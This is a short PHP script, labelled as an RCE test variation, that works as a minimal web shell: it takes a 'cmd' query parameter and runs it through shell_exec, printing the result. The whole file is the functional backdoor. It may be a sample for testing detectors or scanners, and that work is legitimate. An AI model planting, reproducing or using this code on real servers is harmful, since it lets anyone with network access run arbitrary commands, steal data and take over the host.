<?php
// RCE test variation #740
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>